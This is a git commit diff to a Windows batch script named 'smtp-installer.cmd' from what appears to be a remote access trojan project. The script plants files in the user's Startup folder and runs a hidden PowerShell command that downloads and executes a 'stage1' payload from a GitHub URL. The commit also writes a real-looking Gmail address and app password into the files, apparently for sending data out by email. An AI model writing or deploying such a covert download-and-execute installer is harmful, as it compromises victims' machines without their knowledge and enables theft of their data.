7094a5f077d8b2bd0a681f67920e7ee91f32e60a
mridul_249 <mridul60214@gmail.com>
2025-11-10 13:59:04 +0530

    update cred

--- installers/smtp-installer.cmd
+++ installers/smtp-installer.cmd
@@ -2,8 +2,8 @@
 set "XNjFYKECht=%cd%"
 set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %YKHfpmMRoQ%
-echo example@gmail.com > XbrMzmCUiE.txt
-echo password > UJbMLjTIDr.txt
+echo sheltybunny@gmail.com > XbrMzmCUiE.txt
+echo jjnpqhbvngyvaxmh > UJbMLjTIDr.txt
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/mridul249/RAT/main/payloads/stage1.cmd -OutFile wEaoFkNduy.cmd"
 powershell ./wEaoFkNduy.cmd
 cd "%XNjFYKECht%"
